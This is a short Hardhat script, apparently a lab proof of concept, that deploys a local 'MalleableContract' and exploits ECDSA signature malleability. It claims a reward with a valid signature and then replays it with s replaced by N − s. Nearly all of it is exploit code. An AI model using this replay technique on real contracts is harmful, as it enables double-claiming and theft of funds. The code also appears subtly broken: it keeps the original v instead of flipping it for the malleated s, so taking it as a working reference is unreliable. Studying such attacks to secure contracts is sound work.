const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory("MalleableContract");
    const contract = await Factory.deploy();
    await contract.deployed();
    console.log("Contract deployed at:", contract.address);

    const amount = 100;
    const messageHash = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(["address", "uint256"], [attacker.address, amount])
    );

    const ethSignedMessageHash = ethers.utils.hashMessage(ethers.utils.arrayify(messageHash));
    const sig = await attacker.signMessage(ethers.utils.arrayify(messageHash));
    const split = ethers.utils.splitSignature(sig);

    // First call with legit signature
    let tx = await contract.claimReward(amount, sig);
    await tx.wait();
    console.log("✅ First claim success");

    // Malleate `s`
    const N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
    const s = BigInt(split.s);
    const malleatedS = N - s;
    const malSig = ethers.utils.joinSignature({
        r: split.r,
        s: "0x" + malleatedS.toString(16).padStart(64, '0'),
        v: split.v
    });

    // Second call with malleated signature
    tx = await contract.claimReward(amount, malSig);
    await tx.wait();
    console.log("🚨 Second claim success with malleated signature!");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
